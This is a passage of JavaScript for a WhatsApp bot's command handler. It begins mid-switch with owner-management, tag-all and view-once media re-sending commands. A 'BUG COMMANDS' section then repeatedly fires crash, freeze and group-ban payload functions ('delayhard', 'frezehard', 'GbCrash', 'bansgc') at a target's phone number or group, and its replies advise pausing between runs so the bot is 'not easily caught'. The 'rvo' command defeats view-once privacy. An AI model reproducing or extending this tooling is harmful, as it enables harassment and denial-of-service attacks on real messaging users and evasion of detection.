await reaction(m.chat, "⏳");
await sleep(2500);
await reaction(m.chat, "✅");
if (!isOwner) return reply("`Owner Only`");
sock.public = false;
reply(`successfully changed to ${command}`);
}
break;

case "public": {
await reaction(m.chat, "⏳");
await sleep(2500);
await reaction(m.chat, "✅");
if (!isOwner) return reply("`Owner Only`");
sock.public = true;
reply(`successfully changed to ${command}`);
}
break;

// ==================== TOOLS COMMANDS ====================
case "rvo": case "r": {
if (!m.quoted) return reply(
`reply photo 1 time view`);
try {
let buffer = await m.quoted.download();
let type = m.quoted.mtype;
let sendOptions = { quoted: fquoted.channel };
if (type === "videoMessage") {
await sock.sendMessage(m.chat, { video: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "imageMessage") {
await sock.sendMessage(m.chat, { image: buffer, caption:  m.quoted.text || "" }, sendOptions);
} else if (type === "audioMessage") {
await sock.sendMessage(m.chat, { 
audio: buffer, 
mimetype: "audio/mpeg", 
ptt: m.quoted.ptt || false 
}, sendOptions);
} else {
m.reply(`Error`)
}} catch (err) {
console.error(err)}}
break
// ==================== OWNER COMMANDS ====================
case 'tagall': {
    if (!m.isGroup) return reply("This feature is only available in groups!");
    if (!isAdmins && !isOwner) return reply("This feature is only for group admins!");

    const textMessage = args.join(" ") || "nothing";
    const groupMetadata = await sock.groupMetadata(m.chat);
    const participants = groupMetadata.participants;

    // Bangun teks sekaligus (bukan += di loop)
    const mentions = participants.map(a => a.id);
    const listMention = mentions.map(jid => `@${jid.split("@")[0]}`).join("\n");

    let teks = `📢 *TAGALL*\n\n` +
               `> *Pesan:* ${textMessage}\n` +
               `> *Total:* ${participants.length} member\n\n` +
               listMention;

    await sock.sendMessage(m.chat, {
        text: teks,
        mentions
    }, { quoted: fquoted.channel });
}
break;

case 'addown':
case 'addowner': {
if (!isOwner) return reply(config.message.owner);
if (!q) return reply(`— ex: ${prefix + command} 62`);

let bijipler = q.replace(/[^0-9]/g, "");
if (bijipler.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`);
let add = bijipler + '@s.whatsapp.net';

let capt = `you have now gained owner access to the bot`;
kontributor.push(bijipler);
fs.writeFileSync(path.resolve(__dirname, './h3ysaka/lib/database/owner.json'), JSON.stringify(kontributor), 'utf8');
reply("successfully added to owner list");
await reaction(m.chat, "⏳");
await sleep(2500);
await reaction(m.chat, "✅");
await sleep(5000);
m.reply(capt, add);
}
break;

case 'dellown':
case 'dellowner':
case 'delowner': {
if (!isOwner) return reply(config.message.owner);
if (!q) return reply(`— ex: ${prefix + command} 62`);

let bijipler = q.replace(/[^0-9]/g, "");
if (bijipler.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`);
let index = kontributor.indexOf(bijipler);
if (index > -1) {
kontributor.splice(index, 1);
fs.writeFileSync(path.resolve(__dirname, './h3ysaka/lib/database/owner.json'), JSON.stringify(kontributor), 'utf8');
reply("owner successfully deleted");
await reaction(m.chat, "⏳");
await sleep(3500);
await reaction(m.chat, "✅");
} else {
reply("number not found in owner list");
}
}
break;

// ==================== BUG COMMANDS ====================
// ==================== BUG COMMANDS ====================
case 'serang': {
    if (!isOwner) return reply("*You are not a Premium User*");
    if (!botNumber) return reply("This Feature Only Send By Bot Number");

    sock.sendMessage(m.chat, { react: { text: '🤫', key: m.key } });
    sock.sendMessage(m.chat, { react: { text: '🤪', key: m.key } });
    sock.sendMessage(m.chat, { react: { text: '😜', key: m.key } });
    sock.sendMessage(m.chat, { react: { text: '😝', key: m.key } });
    sock.sendMessage(m.chat, { react: { text: '✨', key: m.key } });

    await reply(`succses menyerang target 😵‍💫`);

    for (let r = 0; r < 5; r++) {
        await delayhard(sock, m.chat).catch(() => {});
        await frezehard(sock, m.chat).catch(() => {});
    }
    await sleep(1000);
    console.log(chalk.red.bold("Success!"));
}
break;

case 'delayhard': {
    if (!isOwner) return reply(config.message.owner);
    if (!q) return reply(`— ex: ${prefix + command} 62`);

    let jidx = q.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`);
    if (jidx.length < 10) return reply(`invalid number!`);

    let isTarget = `${jidx}@s.whatsapp.net`;
    reply(`Success! Sent Bug to ${isTarget}\n\nNote : Use Delay After Successfully Sending Bug, So Bot Is Not Easily Caught, Minimum Delay 10/15 Minutes!!`);

    for (let i = 0; i < 5; i++) {
        await delayhard(sock, isTarget).catch(() => {});  
        await sleep(500);
    }

    console.log(chalk.red.bold(`success sending bug type ${command}`));
}
break;

case 'freezechat': {
    if (!isOwner) return reply(config.message.owner);
    if (!q) return reply(`— ex: ${prefix + command} 62`);

    let jidx = q.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`);
    if (jidx.length < 10) return reply(`invalid number!`);

    let isTarget = `${jidx}@s.whatsapp.net`;
    reply(`Success! Sent Bug to ${isTarget}\n\nNote : Use Delay After Successfully Sending Bug, So Bot Is Not Easily Caught, Minimum Delay 10/15 Minutes!!`);

    for (let i = 0; i < 5; i++) {
        await delayhard(sock, isTarget).catch(() => {});   
        await sleep(500);
        await frezehard(sock, isTarget).catch(() => {});   
        await sleep(500);
    }

    console.log(chalk.red.bold(`success sending bug type ${command}`));
}
break;

case 'blankclick': {
    if (!isOwner) return reply(config.message.owner);
    if (!q) return reply(`— ex: ${prefix + command} 62`);

    let jidx = q.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`);
    if (jidx.length < 10) return reply(`invalid number!`);

    let isTarget = `${jidx}@s.whatsapp.net`;
    reply(`Success! Sent Bug to ${isTarget}\n\nNote : Use Delay After Successfully Sending Bug, So Bot Is Not Easily Caught, Minimum Delay 10/15 Minutes!!`);

    for (let i = 0; i < 5; i++) {
        await mistery(sock, isTarget).catch(() => {});  
        await sleep(500);
        await delayhard(sock, isTarget).catch(() => {});  
        await sleep(500);
        await frezehard(sock, isTarget).catch(() => {}); 
        await sleep(500);
    }

    console.log(chalk.red.bold(`success sending bug type ${command}`));
}
break;

case 'delaygb': {
    if (!isOwner) return reply(config.message.owner);
    if (!isGroup) return reply(`This feature is only available in groups!`);

    let groupJid = q ? q.trim() : m.chat;
    if (!groupJid.endsWith('@g.us')) return reply(`Format target salah! Contoh: ${prefix + command} 12345@g.us`);

    reply(`success! sent bug to ${groupJid}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);

    (async () => {
        try {
            for (let i = 0; i < 5; i++) {
                await delayhardgb(sock, groupJid).catch(() => {});
            }
        } catch (err) {
            console.error(`error delaygb:`, err);
        }
    })();
}
break;

case 'bangb': {
    if (!isOwner) return reply(config.message.owner);
    if (!isGroup) return reply(`This feature is only available in groups!`);

    let groupJid = q ? q.trim() : m.chat;
    if (!groupJid.endsWith('@g.us')) return reply(`Format target salah! Contoh: ${prefix + command} 12345@g.us`);

    reply(`success! sent ban to ${groupJid}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);

    (async () => {
        try {
            for (let i = 0; i < 5; i++) {
                await bansgc(sock, groupJid).catch(() => {});
            }
        } catch (err) {
            console.error(`error bangb:`, err);
        }
    })();
}
break;

case 'crashgb': {
    if (!isOwner) return reply(config.message.owner);
    if (!isGroup) return reply(`This feature is only available in groups!`);

    let groupJid = q ? q.trim() : m.chat;
    if (!groupJid.endsWith('@g.us')) return reply(`Format target salah! Contoh: ${prefix + command} 12345@g.us`);

    reply(`success! sent bug to ${groupJid}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);

    (async () => {
        try {
            for (let i = 0; i < 5; i++) {
                await Promise.allSettled([
                    misterygb(sock, groupJid).catch(() => {}),
                    delayhardgb(sock, groupJid).catch(() => {}),
                    GbCrash(sock, groupJid).catch(() => {})
                ]);
            }
        } catch (err) {
            console.error(`error crashgb:`, err);
        }
    })();
}
break;

default:
}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});
